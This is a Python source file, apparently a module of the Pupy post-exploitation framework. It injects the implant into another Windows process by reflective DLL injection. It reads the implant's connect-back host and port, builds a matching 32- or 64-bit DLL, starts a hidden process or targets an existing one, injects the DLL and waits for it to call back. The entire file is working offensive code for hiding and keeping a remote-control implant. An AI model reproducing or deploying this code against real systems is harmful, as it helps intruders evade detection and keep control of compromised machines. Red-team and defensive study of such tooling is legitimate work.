# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import pupygen
import os.path
import time

__class_name__="MigrateModule"


def has_proc_migrated(client, pid):
	for c in client.pupsrv.clients:
		if all([True for x in c.desc if x in ["hostname", "platform", "release", "version", "macaddr"] and client.desc[x]==c.desc[x]]):
			if int(c.desc["pid"])==pid:
				return c
	return None

class MigrateModule(PupyModule):
	""" Migrate pupy into another process using reflective DLL injection """
	max_clients=1
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="migrate", description=self.__doc__)
		group = self.arg_parser.add_mutually_exclusive_group(required=True)
		group.add_argument('-c', '--create', metavar='<exe_path>',help='create a new process and inject into it')
		group.add_argument('pid', nargs='?', type=int, help='pid')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		pid=None
		self.client.load_package("psutil")
		self.client.load_package("pupwinutils.processes")
		if args.create:
			p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
			pid=p.pid
			self.success("%s created with pid %s"%(args.create,pid))
		else:
			pid=args.pid
		dllbuf=b""
		isProcess64bits=False
		#TODO automatically fill ip/port
		self.success("looking for configured connect back address ...")
		res=self.client.conn.modules['pupy'].get_connect_back_host()
		host, port=res.rsplit(':',1)
		self.success("address configured is %s:%s ..."%(host,port))
		self.success("looking for process %s architecture ..."%pid)
		if self.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
			isProcess64bits=True
			self.success("process is 64 bits")
			dllbuff=pupygen.get_edit_pupyx64_dll(host, port)
		else:
			self.success("process is 32 bits")
			dllbuff=pupygen.get_edit_pupyx86_dll(host, port)
		self.success("injecting DLL in target process %s ..."%pid)
		self.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
		self.success("DLL injected !")
		self.success("waiting for a connection from the DLL ...")
		while True:
			c=has_proc_migrated(self.client, pid)
			if c:
				self.success("got a connection from migrated DLL !")
				c.desc["id"]=self.client.desc["id"]
				break
			time.sleep(0.1)
		try:
			self.client.conn.exit()
		except Exception:
			pass


